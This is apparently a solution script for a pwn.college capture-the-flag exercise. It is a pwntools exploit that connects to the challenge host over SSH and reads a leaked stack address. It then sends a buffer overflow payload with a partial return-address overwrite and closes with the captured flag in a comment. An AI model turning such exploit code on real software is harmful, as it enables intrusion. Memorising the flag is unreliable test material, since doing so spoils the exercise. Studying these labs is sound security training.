from pwn import *

elf = context.binary = ELF("./babyrop_level10.1")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyrop_level10.1")

io.recvuntil(b'[LEAK] Your input buffer is located at: ')
buf = int(io.recvline().strip()[:-1], 16)
info("Leak stack: " + hex(buf))

io.send(b'a'*0x28 + p64(buf - 0x10) + b'\x8c')
io.interactive()
# Flag: pwn.college{0vszO0fptEGSNT_Xn8iJbdjywme.0FM2MDLxIjNyEzW}
